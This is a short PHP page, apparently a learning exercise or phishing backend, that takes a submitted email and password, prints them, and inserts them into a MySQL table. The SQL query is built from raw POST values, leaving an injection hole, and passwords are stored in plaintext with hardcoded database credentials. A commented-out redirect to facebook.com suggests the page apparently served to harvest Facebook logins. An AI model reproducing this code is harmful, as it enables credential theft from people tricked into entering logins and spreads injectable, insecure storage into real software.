<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>PHP與MySQL建立網頁資料庫</title>
</head>
<body>
<?php
$servername = "172.31.2.233:8889";
$username = "userx";
$password = "123";
$dbname = "userx";
$emailtest = $_POST["email"];
$pass1 = $_POST["pass1"];
echo var_dump($emailtest)."<br>".var_dump($pass1)."<br>";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
// if ($_SERVER["REQUEST_METHOD"] == "POST") {
//   // 检查是否存在"encpass"字段
//   if (isset($_POST['encpass'])) {
//       // 获取"encpass"字段的值
//       $encryptedPassword = $_POST['encpass'];
//       echo "Encrypted Password: " . $encryptedPassword;
//   } else {
//       echo "未找到encpass字段";
//   }
// } else {
//   echo "没有收到POST请求";
// }
if(isset($_POST['email'])&& isset($_POST['pass1'] )){
  $sql = "INSERT INTO account (`id`,`email`,`password`) VALUES (2,'$emailtest', '$pass1')";
  if ($conn->query($sql) === TRUE) {
    echo "Record inserted successfully";
  } else {
    echo "Error: " . $conn->error;
  }
}
else{
  // echo 'pass';
}
$conn->close();
?>
<!-- <meta http-equiv="refresh" content="0;url= https://www.facebook.com/?locale=zh_TW "> -->
</body>
</html>
